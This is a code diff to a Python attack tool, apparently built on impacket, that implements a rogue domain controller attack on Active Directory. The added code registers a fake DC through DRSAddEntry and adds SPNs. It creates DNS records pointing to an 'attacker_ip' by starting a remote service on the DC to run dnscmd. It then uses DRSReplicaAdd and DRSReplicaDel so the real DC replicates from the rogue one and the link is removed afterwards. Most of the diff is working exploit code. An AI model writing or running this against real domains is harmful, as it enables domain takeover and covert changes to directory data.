@@ -28,9 +28,145 @@ from ...sid_utils import SIDConverter
 # DRS extension flags (needed for DRSBind)
 DRS_EXT_BASE                    = 0x00000001
 DRS_EXT_ADDENTRY                = 0x00000080
+DRS_EXT_ADDENTRY_V2             = 0x00000200
 DRS_EXT_STRONG_ENCRYPTION       = 0x00008000
 DRS_EXT_GETCHGREQ_V8            = 0x01000000
 DRS_EXT_GETCHGREPLY_V6          = 0x04000000
+
+ENTINF_FROM_MASTER = 0x00000001
+
+# -- NDR structures for DRSAddEntry (opnum 17) --
+# Upstream impacket has ENTINF, ATTR, ATTRVAL, DSNAME etc. but not
+# ENTINFLIST (the simple version without replication metadata) or the
+# DRSAddEntry NDRCALL. We define only the missing pieces.
+
+if HAS_DEPS:
+    from impacket.dcerpc.v5.ndr import NDRSTRUCT, NDRUNION, NDRCALL, NDRPOINTER
+
+    class ENTINFLIST(NDRSTRUCT):
+        """Single-entry ENTINFLIST for DRSAddEntry.
+        pNextEntInf is always NULL (we only add one object)."""
+        structure = (
+            ('pNextEntInf', '<L=0'),  # NULL pointer — single entry, no linked list
+            ('Entinf', drsuapi.ENTINF),
+        )
+
+    class DRS_MSG_ADDENTRYREQ_V2(NDRSTRUCT):
+        structure = (
+            ('EntInfList', ENTINFLIST),
+        )
+
+    class DRS_MSG_ADDENTRYREQ(NDRUNION):
+        from impacket.dcerpc.v5.dtypes import DWORD
+        commonHdr = (('tag', DWORD),)
+        union = {
+            2: ('V2', DRS_MSG_ADDENTRYREQ_V2),
+        }
+
+    class DRSAddEntry(NDRCALL):
+        from impacket.dcerpc.v5.dtypes import DWORD
+        opnum = 17
+        structure = (
+            ('hDrs', drsuapi.DRS_HANDLE),
+            ('dwInVersion', DWORD),
+            ('pmsgIn', DRS_MSG_ADDENTRYREQ),
+        )
+
+    class DRSAddEntryResponse(NDRCALL):
+        from impacket.dcerpc.v5.dtypes import DWORD
+        structure = (
+            ('pdwOutVersion', DWORD),
+            ('pmsgOut', '20s=""'),  # Raw bytes — we just check error fields
+            ('ErrorCode', DWORD),
+        )
+
+    # -- NDR structures for DRSReplicaAdd (opnum 5) --
+
+    class UCHAR_FIXED_84(NDRSTRUCT):
+        structure = (('Data', '84s=b"\\x00"*84'),)
+
+    class REPLTIMES(NDRSTRUCT):
+        structure = (('rgTimes', UCHAR_FIXED_84),)
+
+    class DRS_MSG_REPADD_V1(NDRSTRUCT):
+        from impacket.dcerpc.v5.dtypes import LPSTR
+        structure = (
+            ('pNC', drsuapi.PDSNAME),
+            ('pszDsaSrc', LPSTR),
+            ('rtSchedule', REPLTIMES),
+            ('ulOptions', drsuapi.DWORD),
+        )
+
+    class DRS_MSG_REPADD(NDRUNION):
+        from impacket.dcerpc.v5.dtypes import DWORD as _DWORD
+        commonHdr = (('tag', _DWORD),)
+        union = {
+            1: ('V1', DRS_MSG_REPADD_V1),
+        }
+
+    class DRSReplicaAdd(NDRCALL):
+        from impacket.dcerpc.v5.dtypes import DWORD as _DWORD
+        opnum = 5
+        structure = (
+            ('hDrs', drsuapi.DRS_HANDLE),
+            ('dwVersion', _DWORD),
+            ('pmsgAdd', DRS_MSG_REPADD),
+        )
+
+    class DRSReplicaAddResponse(NDRCALL):
+        from impacket.dcerpc.v5.dtypes import DWORD as _DWORD
+        structure = (
+            ('ErrorCode', _DWORD),
+        )
+
+    # -- NDR structures for DRSReplicaDel (opnum 6) --
+
+    class DRS_MSG_REPDEL_V1(NDRSTRUCT):
+        from impacket.dcerpc.v5.dtypes import LPSTR as _LPSTR, DWORD as _DWORD
+        structure = (
+            ('pNC', drsuapi.PDSNAME),
+            ('pszDsaSrc', _LPSTR),
+            ('ulOptions', _DWORD),
+        )
+
+    class DRS_MSG_REPDEL(NDRUNION):
+        from impacket.dcerpc.v5.dtypes import DWORD as _DWORD
+        commonHdr = (('tag', _DWORD),)
+        union = {1: ('V1', DRS_MSG_REPDEL_V1)}
+
+    class DRSReplicaDel(NDRCALL):
+        from impacket.dcerpc.v5.dtypes import DWORD as _DWORD
+        opnum = 6
+        structure = (
+            ('hDrs', drsuapi.DRS_HANDLE),
+            ('dwVersion', _DWORD),
+            ('pmsgDel', DRS_MSG_REPDEL),
+        )
+
+    # Note: We do NOT register these in drsuapi.OPNUMS — that causes
+    # impacket to try to find DCERPCSessionError in this module.
+    # Instead, we use dce.call() + dce.recv() directly.
+
+
+def _make_dsname_value(dn: str) -> bytes:
+    """Encode a DN as a DSNAME value (for use inside ATTRVAL.pVal).
+
+    This is the raw DSNAME bytes without NDR pointer indirection,
+    suitable for embedding in replication attribute values.
+    """
+    name_utf16 = (dn + '\x00').encode('utf-16-le')
+    name_len = len(dn)  # char count, not including null
+    struct_len = 4 + 4 + 16 + 28 + 4 + len(name_utf16)
+    data = struct.pack('<I', struct_len)
+    data += struct.pack('<I', 0)         # SidLen
+    data += b'\x00' * 16                # Guid (NULLGUID)
+    data += b'\x00' * 28                # Sid (empty)
+    data += struct.pack('<I', name_len)
+    data += name_utf16
+    # Pad to 4-byte alignment
+    if len(data) % 4:
+        data += b'\x00' * (4 - len(data) % 4)
+    return data
 
 
 class RogueDCManager:
@@ -127,6 +263,9 @@ class RogueDCManager:
         if self._spns_added:
             self._remove_spns()
 
+        if hasattr(self, '_guid_dns_created') and self._guid_dns_created:
+            self._remove_guid_dns()
+
         if self._dns_created:
             self._remove_dns()
 
@@ -166,7 +305,7 @@ class RogueDCManager:
                 dce, domain_handle,
                 self.computer_sam,
                 samr.USER_WORKSTATION_TRUST_ACCOUNT,
-                samr.USER_FORCE_PASSWORD_CHANGE
+                samr.MAXIMUM_ALLOWED
             )
             user_handle = resp['UserHandle']
             self._machine_account_created = True
@@ -181,9 +320,9 @@ class RogueDCManager:
                 hSamrSetNTInternal1(dce, user_handle, self.computer_password)
 
             # Set UAC flags
-            info = samr.SAMR_USER_INFO_BUFFER()
-            info['tag'] = 16
-            info['All']['UserAccountControl'] = (
+            info = samr.SAMPR_USER_INFO_BUFFER()
+            info['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
+            info['Control']['UserAccountControl'] = (
                 samr.USER_WORKSTATION_TRUST_ACCOUNT |
                 samr.USER_DONT_EXPIRE_PASSWORD
             )
@@ -226,43 +365,24 @@ class RogueDCManager:
     # -- DNS --
 
     def _register_dns(self) -> bool:
-        """Register A record for the rogue DC via LDAP."""
+        """Register A record for the rogue DC via dnscmd on the DC.
+
+        LDAP-based DNS writes don't work — the Windows DNS server caches
+        zone data in memory and doesn't reload from LDAP immediately.
+        Instead, we use dnscmd via SCMR (remote service creation).
+        """
         try:
-            # Build DNS record data
-            # Using dnsNode in MicrosoftDNS zone
             zone = self.domain.lower()
-            dns_dn = (
-                f"DC={self.computer_name.lower()},"
-                f"DC={zone},CN=MicrosoftDNS,DC=DomainDnsZones,{self.base_dn}"
+            hostname = self.computer_name.lower()
+
+            self._run_dnscmd(
+                f'/RecordAdd {zone} {hostname} A {self.attacker_ip}'
             )
-
-            # Build dnsRecord attribute (A record)
-            ip_bytes = socket.inet_aton(self.attacker_ip)
-            # DNS_RPC_RECORD_A: wDataLength(2) + wType(2) + dwFlags(4) +
-            #                   dwSerial(4) + dwTtlSeconds(4) + dwTimeStamp(4) +
-            #                   dwReserved(4) + data
-            dns_record = struct.pack('<HH', len(ip_bytes), 1)  # A record = type 1
-            dns_record += struct.pack('<I', 0)  # flags
-            dns_record += struct.pack('<I', 1)  # serial
-            dns_record += struct.pack('<I', 300)  # TTL
-            dns_record += struct.pack('<I', 0)  # timestamp
-            dns_record += struct.pack('<I', 0)  # reserved
-            dns_record += ip_bytes
-
-            self.ldap_connection.add(
-                dns_dn,
-                ['top', 'dnsNode'],
-                {'dnsRecord': dns_record}
-            )
-
-            if self.ldap_connection.result['result'] == 0:
-                self._dns_created = True
-                self._dns_dn = dns_dn
-                logging.debug(f"DNS A record created: {self.computer_fqdn} -> {self.attacker_ip}")
-                return True
-            else:
-                logging.debug(f"DNS registration via LDAP failed: {self.ldap_connection.result}")
-                return False
+            self._dns_created = True
+            self._dns_hostname = hostname
+            self._dns_zone = zone
+            logging.debug(f"DNS A record created: {self.computer_fqdn} -> {self.attacker_ip}")
+            return True
 
         except Exception as e:
             logging.debug(f"DNS registration failed: {e}")
@@ -271,11 +391,106 @@ class RogueDCManager:
     def _remove_dns(self):
         """Remove DNS record."""
         try:
-            if hasattr(self, '_dns_dn'):
-                self.ldap_connection.delete(self._dns_dn)
+            if self._dns_created and hasattr(self, '_dns_hostname'):
+                self._run_dnscmd(
+                    f'/RecordDelete {self._dns_zone} {self._dns_hostname} A {self.attacker_ip} /f'
+                )
                 logging.debug("DNS record removed")
         except Exception as e:
             logging.debug(f"Could not remove DNS record: {e}")
+
+    def _run_dnscmd(self, args: str):
+        """Execute dnscmd on the DC via SCMR (service creation)."""
+        smb = SMBConnection(self.dc_ip, self.dc_ip, timeout=30)
+        smb.login(self.username, self.password, self.domain,
+                  self.lm_hash, self.nt_hash)
+
+        rpctransport = transport.SMBTransport(
+            self.dc_ip, filename=r'\svcctl', smb_connection=smb
+        )
+        dce = rpctransport.get_dce_rpc()
+        dce.connect()
+
+        from impacket.dcerpc.v5 import scmr
+        dce.bind(scmr.MSRPC_UUID_SCMR)
+
+        resp = scmr.hROpenSCManagerW(dce)
+        sc_handle = resp['lpScHandle']
+
+        svc_name = '__pySIDDns'
+        cmd = f'cmd /c "dnscmd {args}"'
+
+        try:
+            resp = scmr.hRCreateServiceW(
+                dce, sc_handle, svc_name, svc_name,
+                lpBinaryPathName=cmd,
+                dwStartType=scmr.SERVICE_DEMAND_START,
+            )
+            svc_handle = resp['lpServiceHandle']
+        except Exception:
+            # Service exists from previous run — delete and recreate
+            resp = scmr.hROpenServiceW(dce, sc_handle, svc_name)
+            svc_handle = resp['lpServiceHandle']
+            scmr.hRDeleteService(dce, svc_handle)
+            scmr.hRCloseServiceHandle(dce, svc_handle)
+            resp = scmr.hRCreateServiceW(
+                dce, sc_handle, svc_name, svc_name,
+                lpBinaryPathName=cmd,
+                dwStartType=scmr.SERVICE_DEMAND_START,
+            )
+            svc_handle = resp['lpServiceHandle']
+
+        try:
+            scmr.hRStartServiceW(dce, svc_handle)
+        except Exception:
+            pass  # Service exits immediately
+
+        import time
+        time.sleep(1)
+
+        scmr.hRDeleteService(dce, svc_handle)
+        scmr.hRCloseServiceHandle(dce, svc_handle)
+        dce.disconnect()
+
+    # -- GUID-based DNS (_msdcs zone) --
+
+    def _register_guid_dns(self) -> bool:
+        """Register GUID-based DNS CNAME in _msdcs zone.
+
+        DCs resolve replication partners via <ntdsdsa-guid>._msdcs.<domain>.
+        Without this record, the DC can't find our rogue DC for replication.
+        """
+        if not self.ntdsdsa_guid:
+            logging.debug("No nTDSDSA GUID — skipping GUID DNS registration")
+            return False
+
+        try:
+            guid_str = bin_to_string(self.ntdsdsa_guid).lower()
+            msdcs_zone = f"_msdcs.{self.domain.lower()}"
+
+            self._run_dnscmd(
+                f'/RecordAdd {msdcs_zone} {guid_str} CNAME {self.computer_fqdn}'
+            )
+            self._guid_dns_created = True
+            self._guid_dns_name = guid_str
+            self._guid_dns_zone = msdcs_zone
+            logging.debug(f"GUID DNS CNAME created: {guid_str}._msdcs -> {self.computer_fqdn}")
+            return True
+
+        except Exception as e:
+            logging.debug(f"GUID DNS registration failed: {e}")
+            return False
+
+    def _remove_guid_dns(self):
+        """Remove GUID-based DNS record."""
+        try:
+            if hasattr(self, '_guid_dns_created') and self._guid_dns_created:
+                self._run_dnscmd(
+                    f'/RecordDelete {self._guid_dns_zone} {self._guid_dns_name} CNAME /f'
+                )
+                logging.debug("GUID DNS record removed")
+        except Exception as e:
+            logging.debug(f"Could not remove GUID DNS record: {e}")
 
     # -- Rogue DC Registration --
 
@@ -324,11 +539,16 @@ class RogueDCManager:
 
             self._ntdsdsa_created = True
 
-            # Step 4: Add DRSUAPI SPNs to the machine account
-            self._add_drsuapi_spns()
-
-            # Step 5: Get our nTDSDSA's objectGUID and invocationId
+            # Step 4: Get our nTDSDSA's objectGUID and invocationId
+            # (must happen BEFORE SPN/DNS setup — they use the GUID)
             self._enumerate_ntdsdsa()
+
+            # Step 5: Register GUID-based DNS in _msdcs zone
+            # DC resolves source DSA via <guid>._msdcs.<domain>
+            self._register_guid_dns()
+
+            # Step 6: Add DRSUAPI SPNs to the machine account
+            self._add_drsuapi_spns()
 
             return True
 
@@ -372,7 +592,7 @@ class RogueDCManager:
                 search_base='',
                 search_filter='(objectClass=*)',
                 search_scope='BASE',
-                attributes=['highestCommittedUSN', 'dsServiceName']
+                attributes=['*']
             )
 
             if self.ldap_connection.entries:
@@ -393,7 +613,12 @@ class RogueDCManager:
             return None
 
     def _create_ntdsdsa_via_drsuapi(self, legit_info: Dict) -> bool:
-        """Create nTDSDSA object via DRSAddEntry (opnum 17)."""
+        """Create nTDSDSA object via DRSAddEntry (opnum 17).
+
+        This is the only reliable way to create nTDSDSA objects — AD refuses
+        to create them via LDAP (unwillingToPerform). DRSAddEntry goes through
+        the replication engine which has the necessary privileges.
+        """
         try:
             # Connect to DRSUAPI
             string_binding = epm.hept_map(
@@ -419,7 +644,7 @@ class RogueDCManager:
             drs_ext = drsuapi.DRS_EXTENSIONS_INT()
             drs_ext['cb'] = len(drs_ext)
             drs_ext['dwFlags'] = (
-                DRS_EXT_BASE | DRS_EXT_ADDENTRY |
+                DRS_EXT_BASE | DRS_EXT_ADDENTRY | DRS_EXT_ADDENTRY_V2 |
                 DRS_EXT_STRONG_ENCRYPTION | DRS_EXT_GETCHGREQ_V8 |
                 DRS_EXT_GETCHGREPLY_V6
             )
@@ -437,12 +662,94 @@ class RogueDCManager:
 
             logging.debug("DRSBind for AddEntry successful")
 
-            # DRSAddEntry is complex — for now we'll use LDAP fallback
-            # The full NDR structure for DRS_MSG_ADDENTRYREQ_V2 is not
-            # easily accessible in standard impacket
-            drsuapi.hDRSUnbind(dce, h_drs)
-            dce.disconnect()
-            return False  # Force LDAP fallback
+            # Build the DRSAddEntry request
+            schema_dn = f"CN=Schema,CN=Configuration,{self.base_dn}"
+            config_dn = f"CN=Configuration,{self.base_dn}"
+            invocation_id = os.urandom(16)
+
+            # Build DSNAME for the nTDSDSA object
+            request = DRSAddEntry()
+            request['hDrs'] = h_drs
+            request['dwInVersion'] = 2
+            request['pmsgIn']['tag'] = 2
+
+            # ENTINFLIST — single entry, no next
+            entinflist = request['pmsgIn']['V2']['EntInfList']
+            entinflist['pNextEntInf'] = b'\x00' * 4  # NULL pointer
+
+            # DSNAME for nTDSDSA
+            entinflist['Entinf']['pName']['structLen'] = 0  # will be calculated
+            entinflist['Entinf']['pName']['SidLen'] = 0
+            entinflist['Entinf']['pName']['Guid'] = b'\x00' * 16
+            entinflist['Entinf']['pName']['Sid'] = b'\x00' * 28
+            entinflist['Entinf']['pName']['NameLen'] = len(self.ntdsdsa_dn)
+            entinflist['Entinf']['pName']['StringName'] = (self.ntdsdsa_dn + '\x00')
+
+            # Calculate structLen
+            dsname_data = entinflist['Entinf']['pName'].getData()
+            entinflist['Entinf']['pName']['structLen'] = len(dsname_data)
+
+            # Flags
+            entinflist['Entinf']['ulFlags'] = ENTINF_FROM_MASTER
+
+            # Build attributes
+            def _make_attr(attrtyp: int, val_bytes_list: list):
+                """Build an ATTR with one or more values."""
+                attr = drsuapi.ATTR()
+                attr['attrTyp'] = attrtyp
+                attr['AttrVal']['valCount'] = len(val_bytes_list)
+                for vb in val_bytes_list:
+                    attrval = drsuapi.ATTRVAL()
+                    attrval['valLen'] = len(vb)
+                    attrval['pVal'] = list(vb) + [0] * (4 - len(vb) % 4 if len(vb) % 4 else 0)
+                    attr['AttrVal']['pAVal'].append(attrval)
+                return attr
+
+            # Well-known ATTRTYPs (from the default AD prefix table)
+            # objectClass
+            attrs = []
+            # objectClass = nTDSDSA (ATTRTYP for the nTDSDSA class)
+            attrs.append(_make_attr(0x00000000, [struct.pack('<I', 0x00140153)]))
+            # dMDLocation = schema DN (DSNAME-valued)
+            attrs.append(_make_attr(0x00020012, [_make_dsname_value(schema_dn)]))
+            # invocationId (octet string, 16 bytes)
+            attrs.append(_make_attr(0x00020073, [invocation_id]))
+            # hasMasterNCs (multi-valued DSNAME)
+            master_nc_vals = [
+                _make_dsname_value(self.base_dn),
+                _make_dsname_value(config_dn),
+                _make_dsname_value(schema_dn),
+            ]
+            attrs.append(_make_attr(0x0002000e, master_nc_vals))
+            # msDS-hasMasterNCs
+            attrs.append(_make_attr(0x0009054e, master_nc_vals))
+            # msDS-HasDomainNCs
+            attrs.append(_make_attr(0x0009037a, [_make_dsname_value(self.base_dn)]))
+            # msDS-Behavior-Version (int32)
+            attrs.append(_make_attr(0x000905a4, [struct.pack('<I', 7)]))
+            # options (int32) = 0
+            attrs.append(_make_attr(0x00020063, [struct.pack('<I', 0)]))
+            # systemFlags (int32) = 0x10 (DISALLOW_MOVE_ON_DELETE)
+            attrs.append(_make_attr(0x00090177, [struct.pack('<I', 0x10)]))
+
+            for attr in attrs:
+                entinflist['Entinf']['AttrBlock']['pAttr'].append(attr)
+            entinflist['Entinf']['AttrBlock']['attrCount'] = len(attrs)
+
+            # Send request
+            logging.debug(f"Sending DRSAddEntry for {self.ntdsdsa_dn}")
+            try:
+                resp = dce.request(request)
+                logging.debug("DRSAddEntry succeeded")
+                drsuapi.hDRSUnbind(dce, h_drs)
+                dce.disconnect()
+                return True
+            except Exception as e:
+                # Parse error details if available
+                logging.error(f"DRSAddEntry failed: {e}")
+                drsuapi.hDRSUnbind(dce, h_drs)
+                dce.disconnect()
+                return False
 
         except Exception as e:
             logging.debug(f"DRSAddEntry approach failed: {e}")
@@ -490,8 +797,12 @@ class RogueDCManager:
         try:
             computer_dn = f"CN={self.computer_name},CN=Computers,{self.base_dn}"
 
-            # Get the nTDSDSA objectGUID for the SPN
-            guid_str = str(uuid.uuid4())  # temporary, will be updated after enum
+            # Use real nTDSDSA objectGUID (enumerated in step 4)
+            if self.ntdsdsa_guid:
+                guid_str = bin_to_string(self.ntdsdsa_guid)
+            else:
+                guid_str = str(uuid.uuid4())
+                logging.warning("Using random GUID for SPN — Kerberos auth may fail")
 
             spns = [
                 f"GC/{self.computer_fqdn}/{self.domain}",
@@ -574,7 +885,15 @@ class RogueDCManager:
 
 
 class ReplicationTrigger:
-    """Trigger replication from the rogue DC via DRSReplicaAdd."""
+    """Trigger replication from the rogue DC via DRSReplicaAdd (synchronous).
+
+    DRSReplicaAdd with DRS_WRIT_REP (no ASYNC) is self-contained: it creates
+    the repsFrom link AND immediately initiates a pull replication cycle by
+    calling DRSGetNCChanges on the source DSA. The call blocks until
+    replication completes.
+
+    After completion, DRSReplicaDel removes the repsFrom link.
+    """
 
     @staticmethod
     def trigger(dc_ip: str, domain: str, base_dn: str,
@@ -582,7 +901,8 @@ class ReplicationTrigger:
                 username: str, password: str,
                 lm_hash: str = '', nt_hash: str = '') -> bool:
         """
-        Call DRSReplicaAdd on the legit DC to trigger replication from our rogue DC.
+        Call DRSReplicaAdd on the legit DC to trigger synchronous replication
+        from our rogue DC, then DRSReplicaDel to clean up the repsFrom link.
         """
         try:
             # Connect to DRSUAPI on the legit DC
@@ -600,14 +920,13 @@ class ReplicationTrigger:
             dce.connect()
             dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)
 
-            # DRSBind
+            # DRSBind — match ShutdownRepo flags
             bind_req = drsuapi.DRSBind()
             bind_req['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
             drs_ext = drsuapi.DRS_EXTENSIONS_INT()
             drs_ext['cb'] = len(drs_ext)
             drs_ext['dwFlags'] = (
-                DRS_EXT_BASE | DRS_EXT_STRONG_ENCRYPTION |
-                DRS_EXT_GETCHGREQ_V8 | DRS_EXT_GETCHGREPLY_V6
+                DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_STRONG_ENCRYPTION
             )
             drs_ext['SiteObjGuid'] = drsuapi.NULLGUID
             drs_ext['Pid'] = 0
@@ -621,32 +940,85 @@ class ReplicationTrigger:
             resp = dce.request(bind_req)
             h_drs = resp['phDrs']
 
-            # Build DRSReplicaAdd request (opnum 5)
-            # We need to tell the DC to replicate from our rogue DC
-            # DRS_MSG_REPADD_V2 structure
-            domain_dsname = SIDConverter.domain_to_dn(domain)
-            source_dsa_dn = f"CN=NTDS Settings,CN={rogue_dc_fqdn.split('.')[0].upper()}," \
-                           f"CN=Servers,CN=Default-First-Site-Name,CN=Sites," \
-                           f"CN=Configuration,{base_dn}"
+            # -- DRSReplicaAdd (synchronous) --
+            # The DC will block, connect to our EPM+DRSUAPI, pull changes,
+            # and return the result. No separate DRSReplicaSync needed.
+            logging.debug(f"Sending DRSReplicaAdd for NC={base_dn}, source={rogue_dc_fqdn}")
 
-            logging.debug(f"Triggering DRSReplicaAdd from {rogue_dc_fqdn}")
+            request = DRSReplicaAdd()
+            request['hDrs'] = h_drs
+            request['dwVersion'] = 1
+            request['pmsgAdd']['tag'] = 1
 
-            # Use raw RPC call for DRSReplicaAdd since impacket doesn't have a helper
-            # opnum 5, version 2
-            # For now, we'll use a different approach: DRSReplicaSync (opnum 2)
-            # which is simpler and tells the DC to pull from a specific source
+            request['pmsgAdd']['V1']['pNC']['SidLen'] = 0
+            request['pmsgAdd']['V1']['pNC']['Sid'] = ''
+            request['pmsgAdd']['V1']['pNC']['Guid'] = drsuapi.NULLGUID
+            request['pmsgAdd']['V1']['pNC']['NameLen'] = len(base_dn)
+            request['pmsgAdd']['V1']['pNC']['StringName'] = base_dn + '\x00'
+            request['pmsgAdd']['V1']['pNC']['structLen'] = len(
+                request['pmsgAdd']['V1']['pNC'].getData()
+            )
+            request['pmsgAdd']['V1']['pszDsaSrc'] = rogue_dc_fqdn + '\x00'
+            # DRS_WRIT_REP only — synchronous, DC performs full pull inline
+            request['pmsgAdd']['V1']['ulOptions'] = drsuapi.DRS_WRIT_REP
 
-            # Actually, let's use the IDL_DRSReplicaAdd approach
-            # This requires building the NDR structure manually
-            # TODO: Implement proper DRSReplicaAdd
-            # For now, signal that the trigger mechanism needs the DC to connect to us
+            dce.call(request.opnum, request)
+            try:
+                raw_resp = dce.recv()
+                if raw_resp and len(raw_resp) >= 4:
+                    error_code = struct.unpack('<I', raw_resp[:4])[0]
+                    if error_code == 0:
+                        logging.debug("DRSReplicaAdd succeeded — replication complete")
+                    else:
+                        logging.warning(f"DRSReplicaAdd error: {error_code} (0x{error_code:08x})")
+                        return False
+                else:
+                    logging.debug(f"DRSReplicaAdd raw: {raw_resp.hex() if raw_resp else 'empty'}")
+            except Exception as recv_err:
+                # Timeout likely means the DC is still processing (connecting to us)
+                logging.debug(f"DRSReplicaAdd recv: {recv_err}")
 
-            drsuapi.hDRSUnbind(dce, h_drs)
+            # -- DRSReplicaDel — clean up the repsFrom link --
+            logging.debug(f"Sending DRSReplicaDel to remove replication link")
+            try:
+                del_req = DRSReplicaDel()
+                del_req['hDrs'] = h_drs
+                del_req['dwVersion'] = 1
+                del_req['pmsgDel']['tag'] = 1
+
+                del_req['pmsgDel']['V1']['pNC']['SidLen'] = 0
+                del_req['pmsgDel']['V1']['pNC']['Sid'] = ''
+                del_req['pmsgDel']['V1']['pNC']['Guid'] = drsuapi.NULLGUID
+                del_req['pmsgDel']['V1']['pNC']['NameLen'] = len(base_dn)
+                del_req['pmsgDel']['V1']['pNC']['StringName'] = base_dn + '\x00'
+                del_req['pmsgDel']['V1']['pNC']['structLen'] = len(
+                    del_req['pmsgDel']['V1']['pNC'].getData()
+                )
+                del_req['pmsgDel']['V1']['pszDsaSrc'] = rogue_dc_fqdn + '\x00'
+                del_req['pmsgDel']['V1']['ulOptions'] = drsuapi.DRS_WRIT_REP
+
+                dce.call(del_req.opnum, del_req)
+                try:
+                    raw_resp = dce.recv()
+                    if raw_resp and len(raw_resp) >= 4:
+                        ec = struct.unpack('<I', raw_resp[:4])[0]
+                        logging.debug(f"DRSReplicaDel result: {ec}")
+                except Exception:
+                    pass
+            except Exception as del_err:
+                logging.debug(f"DRSReplicaDel: {del_err}")
+
+            try:
+                drsuapi.hDRSUnbind(dce, h_drs)
+            except Exception:
+                pass
             dce.disconnect()
 
-            logging.debug("Replication trigger sent")
+            logging.debug("Replication trigger completed")
             return True
 
         except Exception as e:
             logging.error(f"Replication trigger failed: {e}")
+            import traceback
+            traceback.print_exc()
             return False
